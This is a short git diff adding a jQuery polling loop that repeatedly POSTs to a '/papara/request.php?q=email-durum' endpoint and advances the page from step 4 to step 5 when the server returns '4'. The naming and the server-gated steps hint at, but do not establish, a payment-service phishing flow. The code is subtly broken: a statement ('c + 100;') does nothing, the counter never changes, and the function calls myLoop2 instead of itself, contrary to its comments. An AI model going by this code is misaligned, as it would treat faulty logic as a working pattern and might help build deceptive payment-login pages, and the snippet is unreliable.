@@ -190,6 +190,28 @@ function myLoop2() {         //  create a loop function
   }
   
   
+  var c = 1;
+  function myLoop3() {         //  create a loop function
+    setTimeout(function() {   //  call a 3s setTimeout when the loop is called
+      $.ajax({
+        type: "POST",
+        url: "/papara/request.php?q=email-durum",
+        success: function(response) {
+            if (response == '4'){
+              c + 100;
+              swal.close()
+              $('#step-4').css("display","none");
+            $('#step-5').css("display","flex");
+            }
+        }
+      })  
+      //  your code here
+      // i++;                    //  increment the counter
+      if (c < 10) {           //  if the counter < 10, call the loop function
+        myLoop2();             //  ..  again which will trigger another 
+      }                       //  ..  setTimeout()
+    }, 3000)
+  }
   
   
   
